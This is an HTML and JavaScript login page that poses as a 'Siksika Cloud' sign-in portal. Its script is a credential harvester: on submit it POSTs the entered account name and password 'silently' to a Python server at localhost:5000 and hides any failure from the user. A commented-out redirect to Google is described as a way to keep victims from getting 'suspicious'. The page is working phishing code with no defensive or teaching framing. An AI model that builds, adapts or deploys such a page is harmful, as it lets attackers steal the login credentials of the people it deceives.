<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Siksika Cloud - Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      height: 100vh;
      
     background: url('https://i.ibb.co/XfWWdWwc/pxbee-eraser-2025-12-29-10-23-56.jpg') no-repeat center center fixed;
      background-size: cover;
      position: relative;
      overflow: hidden;
    }

    .container {
  position: relative;
  z-index: 1;
  height: 100vh;
  display: flex;
  align-items: center;    /* Vertically centers the content */
  justify-content: center; /* Horizontally centers the content */
  padding: 20px;
  
  /* New Styles Added Below */
  color: white;           /* Makes the text white */
  font-weight: bold;      /* Makes the text bold */
  text-align: center;     /* Ensures multi-line text is centered */
}

    .login-form {
      position: absolute;
      z-index: 10;
      background: rgba(0, 0, 0, 0.7);
      
      padding: 30px;
      border-radius: 12px;
      width: 320px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .form-title {
      color: white;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 25px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-label {
      color: rgba(255, 255, 255, 0.8);
      font-size: 13px;
      margin-bottom: 8px;
      display: block;
    }

    .form-input {
      width: 100%;
      padding: 12px 16px;
      background: rgba(60, 60, 60, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 6px;
      color: white;
      font-size: 14px;
      transition: all 0.3s ease;
    }

    .form-input:focus {
      outline: none;
      border-color: #4a90e2;
      box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.3);
    }

    .form-input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }

    .password-group {
      position: relative;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: rgba(255, 255, 255, 0.6);
      cursor: pointer;
      font-size: 16px;
    }

    .password-toggle:hover {
      color: rgba(255, 255, 255, 0.8);
    }

   .login-button {
  width: 100%;
  /* Reduced height: 6px is top/bottom, 12px is left/right */
  padding: 6px 12px; 
  
  /* The exact grey from your image (matte charcoal) */
  background-color: #555555; 
  
  /* Ensures no blue gradients or other colors interfere */
  background: #555555; 
  
  border: none;
  border-radius: 8px;
  color: white;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: background-color 0.2s ease;
}

.login-button:hover {
  /* Slightly lighter grey when you hover over it */
  background-color: #666666; 
}
.login-button:hover {
  /* Slightly lighter grey on hover */
  background-color: rgba(120, 120, 120, 0.9);
  transform: translateY(-1px);
  /* Dark shadow instead of blue */
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
}
.login-button:hover {
  /* Becomes slightly more solid/lighter when you hover */
  background-color: rgba(60, 60, 60, 0.8);
  transform: translateY(-1px);
  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
}
    .login-button::before {
      content: '‚Üí';
      font-size: 16px;
    }

    .form-links {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .form-link {
      color: rgba(255, 255, 255, 0.7);
      text-decoration: none;
      font-size: 13px;
      text-align: center;
      transition: color 0.3s ease;
    }

    .form-link:hover {
      color: #4a90e2;
    }

    .footer {
      position: absolute;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      color: rgba(255, 255, 255, 0.8);
      font-size: 13px;
      text-align: center;
      z-index: 10;
    }

    .roads {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      opacity: 0.4;
    }

    @keyframes moveHorizontal {
      from {
        left: -10px;
      }

      to {
        left: calc(100% + 10px);
      }
    }

    @keyframes moveHorizontalReverse {
      from {
        right: -10px;
      }

      to {
        right: calc(100% + 10px);
      }
    }

    @keyframes moveVertical {
      from {
        top: -10px;
      }

      to {
        top: calc(100% + 10px);
      }
    }

    @media (max-width: 768px) {
      .circular-platform {
        width: 300px;
        height: 300px;
      }

      .login-form {
        width: 280px;
        padding: 25px;
      }

      .container {
        padding: 15px;
      }
    }

    @media (max-width: 480px) {
      .circular-platform {
        width: 250px;
        height: 250px;
      }

      .login-form {
        width: 260px;
        padding: 20px;
      }
    }
  </style>
</head>

<body>
  <div class="roads">
    <div class="road road-1"></div>
    <div class="road road-2"></div>
  </div>

  <div class="vehicles">
    <div class="vehicle vehicle-1"></div>
    <div class="vehicle vehicle-2"></div>
    <div class="vehicle vehicle-3"></div>
  </div>

  <div class="container">
    <div class="circular-platform">
      <div class="center-circle"></div>
    </div>

    <div class="login-form">
      <h2 class="form-title">Log in to Siksika Cloud</h2>

      <form id="loginForm">
        <div class="form-group">
          
          <input type="text" id="account" class="form-input" placeholder="Account name" required>
        </div>

        <div class="form-group">
          
          <div class="password-group">
            <input type="password" id="password" class="form-input" placeholder="Password" required>
            <button type="button" class="password-toggle" onclick="togglePassword()">üëÅ</button>
          </div>
        </div>
        <div class="remember-me-container">
  <input type="checkbox" id="remember-me" name="remember-me">
  <label for="remember-me">Remember me</label>
</div>

        <button type="submit" class="login-button">Log in</button>

        <div class="form-links">
          <a href="#" class="form-link">Log in with a device</a>
          <a href="#" class="form-link">Forgot Password?</a>
        </div>
      </form>
    </div>
  </div>

 

  <script>
    function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggleButton = document.querySelector('.password-toggle');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleButton.textContent = 'üôà';
    } else {
        passwordInput.type = 'password';
        toggleButton.textContent = 'üëÅ';
    }
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    const account = document.getElementById('account').value;
    const password = document.getElementById('password').value;

    // Send data silently to your Python server
    fetch('http://localhost:5000', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: account,
            password: password
        })
    })
    .catch(error => {
        // We log to the console for your debugging, but the user won't see an alert
        console.error('Connection failed:', error);
    });

    // OPTIONAL: Redirect the user to a real page so they don't get suspicious
    // window.location.href = "https://www.google.com"; 
});

// Interactive effects
document.querySelectorAll('.form-input').forEach(input => {
    input.addEventListener('focus', function() {
        this.parentElement.style.transform = 'scale(1.02)';
    });
    input.addEventListener('blur', function() {
        this.parentElement.style.transform = 'scale(1)';
    });
});
  </script>
</body>

</html>
